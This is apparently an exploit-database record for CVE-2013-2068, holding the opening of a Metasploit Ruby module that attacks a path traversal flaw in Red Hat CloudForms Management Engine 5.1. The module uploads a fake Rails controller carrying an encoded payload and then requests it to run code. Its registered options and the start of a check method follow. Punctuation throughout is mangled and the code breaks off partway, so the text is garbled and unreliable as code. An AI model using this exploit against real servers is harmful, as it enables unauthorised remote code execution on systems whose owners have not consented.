{
    "text": "vul_name : Red Hat CloudForms Management Engine 5.1 Path Traversal ， vul_cve : CVE-2013-2068 ， vul_poc :  ，  # This module requires Metasploit : http/metasploit.com/download ，  # Current source :  ， require 'msf/core' ， class Metasploit4 < Msf : Exploit : Remote ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : FileDropper ， def initialize ， super (  ， 'Name' => 'Red Hat CloudForms Management Engine 5.1 agent/linuxpkgs Path Traversal' ,  ， 'Description' => %q{ ， This module exploits a path traversal vulnerability in the \"linuxpkgs\" ， action of \"agent\" controller of the Red Hat CloudForms Management Engine 5.1 ，  ( ManageIQ Enterprise Virtualization Manager 5.0 and earlier ) . ， It uploads a fake controller to the controllers directory of the Rails ， application with the encoded payload as an action and sends a request to ， this action to execute the payload. Optionally , it can also upload a routing ， file containing a route to the action. ( Which is not necessary , since the ， application already contains a general default route. )  ， } ,  ， 'Author' => 'Ramon de C Valle' ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2013-2068' ]  ,  ，  [ 'CWE' , '22' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'Platform' => 'ruby' ,  ， 'Arch' => ARCH_RUBY ,  ， 'Privileged' => true ,  ， 'Targets' => ，  [  ，  [ 'Automatic' , {} ]  ，  ]  ,  ， 'DisclosureDate' => 'Sep 4 2013' ,  ， 'DefaultOptions' => ， { ， 'PrependFork' => true ,  ， 'SSL' => true ， } ,  ， 'DefaultTarget' => 0 ， register_options (  ，  [  ， Opt : RPORT ( 443 )  ,  ， OptString.new ( 'CONTROLLER' ,  [ false , 'The name of the controller' ]  )  ,  ， OptString.new ( 'ACTION' ,  [ false , 'The name of the action' ]  )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'The path to the application' , '/' ]  )  ,  ， OptEnum.new ( 'HTTP_METHOD' ,  [ true , 'HTTP Method' , 'POST' ,  [ 'GET' , 'POST' ]  ]  )  ，  ]  , self.class ， register_advanced_options (  ，  [  ， OptBool.new ( 'ROUTES' ,  [ true , 'Upload a routing file. Warning : It is not necessary by default and can damage the target application' , false ]  )  ,  ，  ]  , self.class )  ， end ， def check ， res = send_request_cgi (  ， 'uri' => normalize_uri ( target_uri.path , \"ping.html\" ) ",
    "time": "2013.12.23"
}